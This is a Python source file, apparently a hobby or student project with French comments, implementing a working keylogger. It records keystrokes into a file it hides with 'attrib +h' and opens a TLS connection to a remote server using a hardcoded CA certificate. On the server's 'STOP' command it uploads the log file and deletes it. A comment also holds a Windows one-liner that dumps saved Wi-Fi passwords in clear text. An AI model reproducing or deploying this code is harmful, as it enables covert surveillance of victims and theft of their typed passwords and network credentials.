import socket
import ssl
import os
from pynput.keyboard import Key, Listener
import logging
import platform
import threading

CA_CERTIFICATE = """
-----BEGIN CERTIFICATE-----
MIIFWzCCA0OgAwIBAgIUNPgNdlIcbdPvbnJ0nG+D4MlvkmUwDQYJKoZIhvcNAQEL
BQAwPTELMAkGA1UEBhMCRlIxCzAJBgNVBAgMAjc4MSEwHwYDVQQKDBhJbnRlcm5l
dCBXaWRnaXRzIFB0eSBMdGQwHhcNMjQwMjExMDA1NTAwWhcNMjUwMjEwMDA1NTAw
WjA9MQswCQYDVQQGEwJGUjELMAkGA1UECAwCNzgxITAfBgNVBAoMGEludGVybmV0
IFdpZGdpdHMgUHR5IEx0ZDCCAiIwDQYJKoZIhvcNAQEBBQADggIPADCCAgoCggIB
AI5nJ/QwACd6/mtuTF1RELufXJIQ8qdskakHEn6yCUSRjjTG5WayhgQ811BANoZA
MJPMGJzR54jrI0iImBwLS69T/OIEDRm4ZKND74qAST4KQEG50R8qprTehg3wO9bY
IrvmTELVqAEwmruWGzuzjdGEG/P9Rr3ILCwxJwMl45s7XMTUJ6rf3TrTCu+aTUw6
IHNS+/vcYvMjcgxT9XAj3vXRQW7H8LK2UO7vIU5uOkZd5nFkdbLg3Fzq4k0L1vqd
HCxJguoe5o2KII7WEC615qGV+aDxmnvxuWRGwAjVihPyPUKc/AF5MCUqstnOT18I
mnqs7PrNVZ2o1IqhMaoEdsg/n0lf3n85WM30KaBw6c9AxZz9k/vwr/JO2BtS6xUU
WY+zUBlvxRCKPYgb4uAUJpMOlllsFELPi11YoWTA7VownGLfCH/8ptiz/99Za8xI
TaqJjV2ALOXwvdhoMP1Mlyw5ZZzDb6LRhre8yAVzpuUsjPgBCmIgnxyrkWFzYu3o
NRfxm8brC6ot11KaZL8QYz6ztE+SzUKFwfb+l1JfD6mdpgN3hpuxgMZ2ZPisMcpu
kLIoVDcRwHbQIoNnfpoj3JClZMQpv3dchBLffzgUFvnAqYIt0+yPTr89jCARsHfx
0vC9beALrgtfqrc74K5eZXB1sSYbERDHgiKhR0sB2dKjAgMBAAGjUzBRMB0GA1Ud
DgQWBBSds6m7IUs/2SPYDG1r6fs/fAvzbzAfBgNVHSMEGDAWgBSds6m7IUs/2SPY
DG1r6fs/fAvzbzAPBgNVHRMBAf8EBTADAQH/MA0GCSqGSIb3DQEBCwUAA4ICAQB6
GIYcnbAOe9GT4hTkHPnzIIrFzxW6kNWHyKqgqP90Je5xEIhr0IWEMJSbPH/jqkqL
Vto1nV4joYqOMaiPqHsYJdXbOBYA9dqq3RDJZFQCI5N6zbLhCHndaF91b0SuU4Pz
wjET7kI+btJ5HaPoRVdEEKbdJkK9I2E9g5rgIMJ3KyXCWgO1yULB8S0mqTJK8Paq
31UySkw7skFHudmAT4JXxFH78h4UrPy+mml3pQlpZaG8s09WD/X8eK8nvduBcsiA
k1BsFK13WENN1UApgEai0HAbR38S6ksfwlyLPZrbFKM2agv6wHnvfZSM9WkS3ruH
cS8XHWNZC9tpzIZ9Fnods9t2I4kKXY4aZYNua+odSR7iGByszLi0H5Ge77ZRH0Th
/0HtIX4vk+rWDV++C53Tr+fKP1iA10fV7+jcL2CPhl2EvAbwiocTcMjwVNrEc/n1
AyWRLy2ZSpkQWosTtrX+y2aTWYuBVH1Rm7lWhRiUv3e631djjwa4NjXWEadh/Q3o
8Ijn632J/n2cH3irMgQQYIrZsz2jlvVJhtx5ufL7Au8xOyNEBGKbqcVXX9Sccu/+
f07S5x+gTRFtDpVLFKrjOgqC0fNxsIidfKwpTAcfj+tQ0/X9uB1t7w6uId1zZmhg
vSfhnc+PtLb1ifNDnSdqkHsk3mpMlLQZ2uYGLYpCVg==
-----END CERTIFICATE-----
"""

# for /f "skip=9 tokens=1,2 delims=:" %i in ('netsh wlan show profiles') do @echo %j | findstr -i -v echo | netsh wlan show profiles %j key=clear
def check_platform():
    return platform.system()

def find_ca_cert_path():
    for r, d, f in os.walk("c:\\"): 
        for files in f:
            if files == "ca-cert.pem":
                path = os.path.join(r, files)
                if path.endswith("SSL\\CA\\ca-cert.pem"):
                    return path  
    return None 
    
def os_check():
        current_platform = check_platform()
        if current_platform == 'Windows':
            #print('Windows')
            return 'Windows'
        elif current_platform == 'Linux':
            #print('Linux')
            return 'Linux'   
        else:
            return None

def send_file(conn, filename):
    try:
        with open(filename, 'rb') as f:
            while True:
                chunk = f.read(1024)  # Lire un chunk du fichier
                print(f"chunk {chunk}")
                if not chunk:
                    break  # Si le chunk est vide, on a atteint la fin du fichier
                conn.sendall(chunk)  # Envoyer le chunk au client
    finally:
        # Fermer le fichier
        f.close()
        os.remove(filename)

def key_logger(path_hidden_file, client_ssl):
    logging.basicConfig(filename=path_hidden_file, level=logging.DEBUG, format="%(asctime)s - %(message)s")
    os.system(f"attrib +h {path_hidden_file}")  # Rendre le fichier caché

    def on_press(key):
        logging.info(str(key))

    # Crée un écouteur de clavier pour enregistrer les touches
    with Listener(on_press=on_press) as listener:
        # Crée un thread pour écouter les messages du serveur
        server_listener_thread = threading.Thread(target=listen_to_server, args=(client_ssl,))
        server_listener_thread.start()

        # Attend que le thread du serveur se termine
        server_listener_thread.join()

        # Une fois le thread du serveur terminé, on arrête le keylogger
        listener.stop()
        exit(1)

def listen_to_server(client_ssl):
    while True:
        msg = client_ssl.recv(1024).decode()
        print(f"Server : {msg}")
        if msg == "STOP":
            print("stop")
            send_file(client_ssl, "its_a_trap.txt")
            exit(1)


def main():
    print('main active')
    os_local = os_check()
    print(os_local)
    if os_local == 'Windows':
        #print("Wait until the programme find the certificate file on your device ...")
        #ca_cert_path = find_ca_cert_path()
        #print(ca_cert_path)
        #script_dir = os.path.dirname(os.path.realpath(__file__))
        #ca_cert_path = os.path.abspath(os.path.join(script_dir, "..", "..","SSL", "CA", "ca-cert.pem"))
        # ca_cert_path = "C:/Users/rrais/Desktop/Dev/Python_Scripting/SSL/CA/ca-cert.pem" # take this path when you run it on .exe
        #print("CA cert path:", ca_cert_path)
        context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        context.load_verify_locations(cadata=CA_CERTIFICATE)

        # Setting
        host = '192.168.1.43' #remplacer par l'ip du serveur
        port = 90
        socket_obj = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        # Secure the socket
        client_ssl = context.wrap_socket(socket_obj, server_hostname=host)
        client_ssl.connect((host, port))
    #bien ou quoi
        while True:
            try:
                key_logger("its_a_trap.txt", client_ssl)
                    
                    #exit(1)
                    #print("-- END --")
                    #client_ssl.close()
                
            except Exception as e:
                print(f"Error: {e}")
                break

        print("-- END --")
        client_ssl.close()
    else : 
        print("linux in maintenance")

if __name__ == "__main__":
    main()
